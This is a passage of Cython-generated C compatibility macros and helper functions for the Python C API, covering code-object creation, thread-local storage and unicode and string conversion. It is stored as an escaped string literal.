__has_cpp_attribute(fallthrough)\\n      #define CYTHON_FALLTHROUGH [[fallthrough]]\\n    #elif __has_cpp_attribute(clang::fallthrough)\\n      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\\n    #elif __has_cpp_attribute(gnu::fallthrough)\\n      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\\n    #endif\\n  #endif\\n  #ifndef CYTHON_FALLTHROUGH\\n    #if __has_attribute(fallthrough)\\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\\n    #else\\n      #define CYTHON_FALLTHROUGH\\n    #endif\\n  #endif\\n  #if defined(__clang__ ) && defined(__apple_build_version__)\\n    #if __apple_build_version__ < 7000000\\n      #undef  CYTHON_FALLTHROUGH\\n      #define CYTHON_FALLTHROUGH\\n    #endif\\n  #endif\\n#endif\\n""\\n#ifndef CYTHON_INLINE\\n  #if defined(__clang__)\\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\\n  #elif defined(__GNUC__)\\n    #define CYTHON_INLINE __inline__\\n  #elif defined(_MSC_VER)\\n    #define CYTHON_INLINE __inline\\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\n    #define CYTHON_INLINE inline\\n  #else\\n    #define CYTHON_INLINE\\n  #endif\\n#endif\\n\\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)\\n  #define Py_OptimizeFlag 0\\n#endif\\n#define __PYX_BUILD_PY_SSIZE_T \\\"n\\\"\\n#define CYTHON_FORMAT_SSIZE_T \\\"z\\\"\\n#if PY_MAJOR_VERSION < 3\\n  #define __Pyx_BUILTIN_MODULE_NAME \\\"__builtin__\\\"\\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, ln\"\"os)\\\\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\n  #define __Pyx_DefaultClassType PyClass_Type\\n#else\\n  #define __Pyx_BUILTIN_MODULE_NAME \\\"builtins\\\"\\n  #define __Pyx_DefaultClassType PyType_Type\\n#if PY_VERSION_HEX >= 0x030B00A1\\n    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,\\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\\n                                                    PyObject *name, int fline, PyObject *lnos) {\\n        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;\\n        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;\\n        const char *fn_cstr=NULL;\\n        const char *name_cstr=NULL;\\n        PyCodeObject* co=NULL;\\n        PyObject *type, *value, *traceback;\\n        PyErr_Fetch(&type, &value, &traceback);\\n        if (!(kwds=PyDict_New())) goto end;\\n        if (!(argcount=PyLong_FromLong(a))) goto end;""\\n        if (PyDict_SetItemString(kwds, \\\"co_argcount\\\", argcount) != 0) goto end;\\n        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_posonlyargcount\\\", posonlyargcount) != 0) goto end;\\n        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_kwonlyargcount\\\", kwonlyargcount) != 0) goto end;\\n        if (!(nlocals=PyLong_FromLong(l))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_nlocals\\\", nlocals) != 0) goto end;\\n        if (!(stacksize=PyLong_FromLong(s))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_stacksize\\\", stacksize) != 0) goto end;\\n        if (!(flags=PyLong_FromLong(f))) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_flags\\\", flags) != 0) goto end;\\n        if (PyDict_SetItemSt\"\"ring(kwds, \\\"co_code\\\", code) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_consts\\\", c) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_names\\\", n) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_varnames\\\", v) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_freevars\\\", fv) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_cellvars\\\", cell) != 0) goto end;\\n        if (PyDict_SetItemString(kwds, \\\"co_linetable\\\", lnos) != 0) goto end;\\n        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;\\n        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;\\n        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;\\n        if (!(replace = PyObject_GetAttrString((PyObject*)co, \\\"replace\\\"))) goto cleanup_code_too;\\n        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here\\n        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;\\n        Py_XDECREF((PyObject*)co);\\n        co ="" (PyCodeObject*)call_result;\\n        call_result = NULL;\\n        if (0) {\\n            cleanup_code_too:\\n            Py_XDECREF((PyObject*)co);\\n            co = NULL;\\n        }\\n        end:\\n        Py_XDECREF(kwds);\\n        Py_XDECREF(argcount);\\n        Py_XDECREF(posonlyargcount);\\n        Py_XDECREF(kwonlyargcount);\\n        Py_XDECREF(nlocals);\\n        Py_XDECREF(stacksize);\\n        Py_XDECREF(replace);\\n        Py_XDECREF(call_result);\\n        Py_XDECREF(empty);\\n        if (type) {\\n            PyErr_Restore(type, value, traceback);\\n        }\\n        return co;\\n    }\\n#else\\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\n#endif\\n  #define __Pyx_DefaultClassType PyType_Type\\n#endif\\n#ifndef Py_TPFLAGS_CHECKTYPES\\n  #define Py_TPFLAGS_CHECKTYPES 0\\n#endif\\n#if\"\"ndef Py_TPFLAGS_HAVE_INDEX\\n  #define Py_TPFLAGS_HAVE_INDEX 0\\n#endif\\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\\n#endif\\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\\n#endif\\n#ifndef METH_STACKLESS\\n  #define METH_STACKLESS 0\\n#endif\\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\\n  #ifndef METH_FASTCALL\\n     #define METH_FASTCALL 0x80\\n  #endif\\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\\n                                                          Py_ssize_t nargs, PyObject *kwnames);\\n#else\\n  #define __Pyx_PyCFunctionFast _PyCFunctionFast\\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\\n#endif\\n#if CYTHON_FAST_PYCCALL\\n#define __Pyx_PyFastCFunction_Check(func)\\\\\\n    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(ME""TH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))\\n#else\\n#define __Pyx_PyFastCFunction_Check(func) 0\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\\n  #define PyObject_Free(p)     PyMem_Free(p)\\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1\\n  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)\\n  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)\\n  #define PyMem_RawFree(p)             PyMem_Free(p)\\n#endif\\n#if CYTHON_COMPILING_IN_PYSTON\\n  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)\\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)\\n#else\\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\\n#endif\\n#if !CYTHON_FAST_THREAD_STATE || PY_VER\"\"SION_HEX < 0x02070000\\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\\n#elif PY_VERSION_HEX >= 0x03060000\\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\\n#elif PY_VERSION_HEX >= 0x03000000\\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\\n#else\\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\\n#endif\\n#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)\\n#include \\\"pythread.h\\\"\\n#define Py_tss_NEEDS_INIT 0\\ntypedef int Py_tss_t;\\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {\\n  *key = PyThread_create_key();\\n  return 0;\\n}\\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {\\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\\n  *key = Py_tss_NEEDS_INIT;\\n  return key;\\n}\\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\\n  PyObject_Free(key);\\n}\\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t"" *key) {\\n  return *key != Py_tss_NEEDS_INIT;\\n}\\nstatic CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {\\n  PyThread_delete_key(*key);\\n  *key = Py_tss_NEEDS_INIT;\\n}\\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\\n  return PyThread_set_key_value(*key, value);\\n}\\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\\n  return PyThread_get_key_value(*key);\\n}\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\\n#else\\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\\n#endif\\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\\n#else\\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_\"\"HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS\\n#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\\n#else\\n#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)\\n#endif\\n#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\\n  #define CYTHON_PEP393_ENABLED 1\\n  #if PY_VERSION_HEX >= 0x030C0000\\n    #define __Pyx_PyUnicode_READY(op)       (0)\\n  #else\\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\\n  #endif\\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\\n  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)\\n  #define __Pyx_Py""Unicode_DATA(u)         PyUnicode_DATA(u)\\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)\\n  #if PY_VERSION_HEX >= 0x030C0000\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\\n  #else\\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\\n    #else\\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\\n    #endif\\n  #endif\\n#else\\n  #define CYTHON_PEP393_ENABLED 0\\n  #define PyUnicode_1BYTE_KIND  1\\n  #define PyUnicode_2BYTE_KIND  2\\n  #define PyUnicode_4BYTE_KIND  4\\n  #define __Pyx_PyUnicode_READY(op)       (0)\\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u) \"\"  ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)\\n  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))\\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)\\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY\\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\\n#else\\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\\n#endif\\n#if CYTHON_COMPILING_IN_PY""PY && !defined(PyUnicode_Contains)\\n  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)\\n  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\\n#endif\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)\\n  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, \\\"__format__\\\", \\\"O\\\", fmt)\\n#endif\\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\\n#if PY_MAJOR_VERSION >= 3\\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\\n#else\\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\\n#endif\\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define PyBaseString_Type            PyUnicod\"\"e_Type\\n  #define PyStringObject               PyUnicodeObject\\n  #define PyString_Type                PyUnicode_Type\\n  #define PyString_Check               PyUnicode_Check\\n  #define PyString_CheckExact          PyUnicode_CheckExact\\n#ifndef PyObject_Unicode\\n  #define PyObject_Unicode             PyObject_Str\\n#endif\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\\n#else\\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\\n#endif\\n#ifndef PySet_CheckExact\\n  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)\\n#endif\\n#if PY_VERSION_HEX >= ""0x030900A4\\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\\n#else\\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\\n#endif\\n#if CYTHON_ASSUME_SAFE_MACROS\\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\\n#else\\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define PyIntObject                  PyLongObject\\n  #define PyInt_Type                   PyLong_Type\\n  #define PyInt_Check(op)              PyLong_Check(op)\\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\\n  #define PyInt_FromString             PyLong_FromString\\n  #define PyInt_FromUnicode            PyLong_FromUnicode\\n  #define PyInt_FromLong               PyLong_FromLong\\n  #define PyInt_FromSize_t             PyLong_FromSize_t\\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\\n  #define PyInt_AsLong                 PyLong_AsLong\\n  #define PyInt_AS_LONG                PyLong_AS_LONG\\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\\n  #define PyInt_AsUnsignedLongMa\"\"sk     PyLong_AsUnsignedLongMask\\n  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask\\n  #define PyNumber_Int                 PyNumber_Long\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define PyBoolObject                 PyLongObject\\n#endif\\n#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\\n  #ifndef PyUnicode_InternFromString\\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\\n  #endif\\n#endif\\n#if PY_VERSION_HEX < 0x030200A4\\n  typedef long Py_hash_t;\\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\\n#else\\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t\\n#endif\\n#if PY_MAJOR_VERSION >= 3\\n  #define __Pyx_PyMeth""od_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))\\n#else\\n  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)\\n#endif\\n#if CYTHON_USE_ASYNC_SLOTS\\n  #if PY_VERSION_HEX >= 0x030500B1\\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\\n  #else\\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\\n  #endif\\n#else\\n  #define __Pyx_PyType_AsAsync(obj) NULL\\n#endif\\n#ifndef __Pyx_PyAsyncMethodsStruct\\n    typedef struct {\\n        unaryfunc am_await;\\n        unaryfunc am_aiter;\\n        unaryfunc am_anext;\\n    } __Pyx_PyAsyncMethodsStruct;\\n#endif\\n\\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\\n  #if !defined(_USE_MATH_DEFINES)\\n    #define _USE_MATH_DEFINES\\n  #endif\\n#endif\\n#include <math.h>\\n#ifdef NAN\\n#define __PYX_NAN() ((float) NAN)\\n#else\\nstatic CYTHON_INLINE float __PYX_NAN() {\\n  float value;\\n  memset(&value, 0xFF, sizeof(value));\\n  return value;\\n}\\n#endif\\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\\n#define __Pyx_truncl trunc\\n#else\\n#define __Pyx_truncl truncl\\n#endif\\n\\n#define __P\"\"YX_MARK_ERR_POS(f_index, lineno) \\\\\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }\\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\\\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\\n\\n#ifndef __PYX_EXTERN_C\\n  #ifdef __cplusplus\\n    #define __PYX_EXTERN_C extern \\\"C\\\"\\n  #else\\n    #define __PYX_EXTERN_C extern\\n  #endif\\n#endif\\n\\n#define __PYX_HAVE__source\\n#define __PYX_HAVE_API__source\\n/* Early includes */\\n#ifdef _OPENMP\\n#include <omp.h>\\n#endif /* _OPENMP */\\n\\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\\n#define CYTHON_WITHOUT_""ASSERTIONS\\n#endif\\n\\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\\n\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\\n#define __PYX_DEFAULT_STRING_ENCODING \\\"\\\"\\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\\n#define __Pyx_long_cast(x) ((long)x)\\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py\"\"_ssize_t limit) {\\n    return (size_t) i < (size_t) limit;\\n}\\n#if defined (__cplusplus) && __cplusplus >= 201103L\\n    #include <cstdlib>\\n    #define __Pyx_sst_abs(value) std::abs(value)\\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\\n    #define __Pyx_sst_abs(value) abs(value)\\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\\n    #define __Pyx_sst_abs(value) labs(value)\\n#elif defined (_MSC_VER)\\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\n    #define __Pyx_sst_abs(value) llabs(value)\\n#elif defined (__GNUC__)\\n    #define __Pyx_sst_abs(value) __builtin_llabs(valu""e)\\n#else\\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\\n#endif\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\\n#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))\\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\\n#if PY_MAJOR_VERSION < 3\\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\\n#else\\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString\\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\\n#endif\\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsSString(s)    ((const signed\"\" char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\\n#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\\n#define __Pyx_PyObject_FromCSt""ring(s)  __Pyx_PyObject_FromString((const char*)s)\\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {\\n    const Py_UNICODE *u_end = u;\\n    while (*u_end++) ;\\n    return (size_t)(u_end - u - 1);\\n}\\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)\\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\\n#define __Pyx_PySequence_Tuple(obj)\\\\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_\"\"t(size_t);\\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\\n#if CYTHON_ASSUME_SAFE_MACROS\\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\\n#else\\n#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\\n#endif\\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\\n#if PY_MAJOR_VERSION >= 3\\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\\n#else\\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_""Int(x))\\n#endif\\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))\\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\\n    PyObject* sys;\\n    PyObject* default_encoding = NULL;\\n    PyObject* ascii_chars_u = 